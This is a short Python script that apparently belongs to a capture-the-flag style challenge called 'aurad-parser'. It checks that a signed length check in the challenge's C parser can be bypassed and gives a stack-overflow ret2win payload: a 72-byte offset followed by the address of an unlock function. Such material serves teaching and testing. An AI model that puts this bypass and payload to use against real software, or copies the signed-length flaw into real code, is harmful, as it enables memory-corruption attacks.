#!/usr/bin/env python3
"""Layout-INDEPENDENT verification for aurad-parser.

I cannot compile/run ELF on the authoring machine, so this proves the part of the
bug that does not depend on binary layout: that the SIGNED length check is
bypassable and the bypassing value becomes an enormous size_t at the fread().
The memory-corruption offset (72) is derived from source below and MUST be
confirmed with `cyclic` on the built binary (healthcheck.sh does this)."""

def read_len_be32(b4: bytes) -> int:
    v = (b4[0] << 24) | (b4[1] << 16) | (b4[2] << 8) | b4[3]
    return v - 0x100000000 if v & 0x80000000 else v      # interpret as int32

def passes_check(length: int) -> bool:
    return not (length > 64)                              # the C: if (len > 64) reject

def as_size_t(length: int) -> int:
    return length & 0xFFFFFFFFFFFFFFFF                    # (size_t)len on 64-bit

# The exploit sends length bytes ff ff ff ff  ==  -1 signed
wire = bytes([0xFF, 0xFF, 0xFF, 0xFF])
length = read_len_be32(wire)
assert length == -1, f"decoded {length}"
assert passes_check(length), "negative length should pass the > 64 check"
assert as_size_t(length) == 0xFFFFFFFFFFFFFFFF, "should become SIZE_MAX at fread"

# a legitimate large positive length is correctly rejected (control)
assert not passes_check(1000), "positive over-length must be rejected"
# and small positive lengths are the intended safe path
assert passes_check(10)

# ret2win offset, from the source layout (gcc -O0, no canary):
#   char buf[64] at rbp-0x40 ; saved rbp at rbp ; return addr at rbp+8
#   distance(buf -> return addr) = 64 + 8 = 72
OFFSET = 64 + 8
print("aurad-parser reachability OK")
print(f"  wire length ff ff ff ff -> int32 {length} -> passes '>64' check -> size_t {as_size_t(length):#x}")
print(f"  => fread() overflows the 64-byte buffer with attacker-controlled data")
print(f"  ret2win offset (from source, VERIFY with cyclic on build) = {OFFSET}")
print(f"  payload = b'A'*{OFFSET} + p64(&unlock)   (+ optional ret gadget for movaps alignment)")
